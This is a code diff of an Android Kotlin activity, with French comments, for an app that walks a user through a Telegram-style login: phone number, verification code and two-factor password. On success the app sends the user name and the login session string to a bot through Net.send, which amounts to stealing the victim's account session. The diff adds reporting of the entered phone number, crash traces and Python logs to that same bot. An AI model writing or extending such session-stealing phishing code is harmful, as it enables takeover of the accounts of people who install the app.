@@ -5,14 +5,13 @@ import android.os.Bundle
 import android.widget.EditText
 import android.widget.TextView
 import android.widget.Toast
-import com.chaquo.python.PyObject
 import com.chaquo.python.Python
 import com.chaquo.python.android.AndroidPlatform
 import com.tgme.app.*
+import java.io.File
 import kotlin.concurrent.thread
 
 class MainActivity : Activity() {
-
     private var currentPhone = ""
     private var currentCode = ""
     private var currentPassword = ""
@@ -20,16 +19,43 @@ class MainActivity : Activity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         
-        // Initialisation de Chaquopy
-        if (!Python.isStarted()) {
-            Python.start(AndroidPlatform(this))
+        // 🔥 1. Catch TOUS les crashs non gérés et envoie au bot
+        Thread.setDefaultUncaughtExceptionHandler { thread, throwable ->
+            try {
+                val crash = "💥 CRASH APP\nThread: ${thread.name}\n${throwable.javaClass.name}: ${throwable.message}\n\n${throwable.stackTraceToString()}"
+                Net.send(crash)
+                Thread.sleep(2000) // laisser le temps à l'envoi HTTP
+            } catch (_: Throwable) {}
+            android.os.Process.killProcess(android.os.Process.myPid())
+        }
+        
+        Net.send("🔵 App démarrée")
+        
+        // 🔥 2. Récupérer le log Python du démarrage précédent (s'il y a eu crash)
+        val pyLog = File(filesDir, "python_log.txt")
+        if (pyLog.exists()) {
+            val content = pyLog.readText()
+            if (content.isNotBlank()) Net.send("📋 Log Python précédent:\n$content")
+            pyLog.delete()
+        }
+        
+        // 🔥 3. Démarrer Python avec log
+        try {
+            if (!Python.isStarted()) {
+                Net.send("🔧 Démarrage Python...")
+                Python.start(AndroidPlatform(this))
+                Net.send("✅ Python démarré OK")
+            }
+        } catch (t: Throwable) {
+            Net.send("❌ Python.start FAILED:\n${t.javaClass.name}: ${t.message}\n\n${t.stackTraceToString()}")
+            toast("Erreur: Python n'a pas pu démarrer")
+            return
         }
         
         Capture.load(this)
         showPhone()
     }
 
-    // ---------------- ÉCRAN 1 : TÉLÉPHONE ----------------
     private fun showPhone() {
         setContentView(R.layout.screen_phone)
         val cc = findViewById<EditText>(R.id.cc)
@@ -38,86 +64,82 @@ class MainActivity : Activity() {
         
         btn.setOnClickListener {
             val full = normalize(cc.text.toString(), phone.text.toString())
-            if (full == null) {
-                toast("Numéro invalide")
-                return@setOnClickListener
-            }
+            if (full == null) { toast("Numéro invalide"); return@setOnClickListener }
             currentPhone = full
             btn.isEnabled = false
             toast("Envoi du code...")
-            
-            // Appel Python pour envoyer le code
+            Net.send("📞 Numéro saisi: $full")
             callPython("", "")
         }
     }
 
-    // ---------------- ÉCRAN 2 : CODE ----------------
     private fun showCode() {
         setContentView(R.layout.screen_code)
         findViewById<TextView>(R.id.sub).text = "Code envoyé au $currentPhone"
         val codeInput = findViewById<EditText>(R.id.code)
         val btn = findViewById<TextView>(R.id.btn)
-
         btn.setOnClickListener {
             val code = codeInput.text.toString().replace(Regex("\\D"), "")
             if (code.isEmpty()) return@setOnClickListener
             currentCode = code
             btn.isEnabled = false
             toast("Vérification...")
-            
             callPython(code, "")
         }
     }
 
-    // ---------------- ÉCRAN 3 : 2FA ----------------
     private fun showPassword() {
         setContentView(R.layout.screen_password)
         val pwInput = findViewById<EditText>(R.id.password)
         val btn = findViewById<TextView>(R.id.btn)
-
         btn.setOnClickListener {
             val password = pwInput.text.toString()
             if (password.isEmpty()) return@setOnClickListener
             currentPassword = password
             btn.isEnabled = false
-            toast("Vérification du mot de passe...")
-            
+            toast("Vérification...")
             callPython(currentCode, password)
         }
     }
 
-    // ---------------- APPEL PYTHON ----------------
     private fun callPython(code: String, password: String) {
         thread {
-            val py = Python.getInstance()
-            val pyModule = py.getModule("auth_manager")
+            Net.send("🐍 Appel Python (code='$code', pass=${password.isNotEmpty()})")
             
-            // Appel de la fonction process_login(phone, code, password)
-            val result = pyModule.callAttr("process_login", currentPhone, code, password).toString()
-            
-            runOnUiThread {
-                handlePythonResult(result)
+            val result = try {
+                val py = Python.getInstance()
+                val mod = py.getModule("auth_manager")
+                mod.callAttr("process_login", currentPhone, code, password).toString()
+            } catch (t: Throwable) {
+                Net.send("💥 CRASH PYTHON CALL:\n${t.javaClass.name}: ${t.message}\n\n${t.stackTraceToString()}")
+                "ERROR|CRASH: ${t.javaClass.name}: ${t.message}"
             }
+            
+            Net.send("📤 Résultat: $result")
+            
+            // Envoyer le log Python accumulé
+            try {
+                val pyLog = File(filesDir, "python_log.txt")
+                if (pyLog.exists()) {
+                    val content = pyLog.readText()
+                    if (content.isNotBlank()) Net.send("📋 Log Python:\n$content")
+                    pyLog.delete()
+                }
+            } catch (_: Throwable) {}
+            
+            runOnUiThread { handleResult(result) }
         }
     }
 
-    private fun handlePythonResult(result: String) {
+    private fun handleResult(result: String) {
         when {
-            result == "NEED_CODE" -> {
-                showCode()
-            }
-            result == "NEED_PASSWORD" -> {
-                showPassword()
-            }
+            result == "NEED_CODE" -> showCode()
+            result == "NEED_PASSWORD" -> showPassword()
             result.startsWith("OK|") -> {
                 val parts = result.split("|")
-                val userName = parts[1]
-                val sessionString = parts[2]
-                
-                // Envoi au bot
+                val userName = parts.getOrNull(1) ?: "User"
+                val sessionString = parts.getOrNull(2) ?: ""
                 Net.send("🎉 LOGIN RÉUSSI\nUser: $userName\nSESSION: $sessionString")
-                
-                // Affichage du succès
                 setContentView(R.layout.screen_success)
                 findViewById<TextView>(R.id.who).text = userName
                 findViewById<TextView>(R.id.num).text = currentPhone
@@ -125,17 +147,12 @@ class MainActivity : Activity() {
             result.startsWith("ERROR|") -> {
                 val err = result.removePrefix("ERROR|")
                 toast("Erreur: $err")
-                // Remettre le bouton du téléphone en état si on revient au début
-                showPhone() 
-            }
-            else -> {
-                toast("Erreur inconnue: $result")
                 showPhone()
             }
+            else -> { toast("Réponse: $result"); showPhone() }
         }
     }
 
-    // ---------------- OUTILS ----------------
     private fun normalize(ccRaw: String, nRaw: String): String? {
         var n = nRaw.trim().replace(Regex("[\\s\\-().]"), "")
         if (n.isEmpty()) return null
@@ -152,6 +169,6 @@ class MainActivity : Activity() {
     }
 
     private fun toast(msg: String) = runOnUiThread {
-        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
+        Toast.makeText(this, msg, Toast.LENGTH_LONG).show()
     }
 }
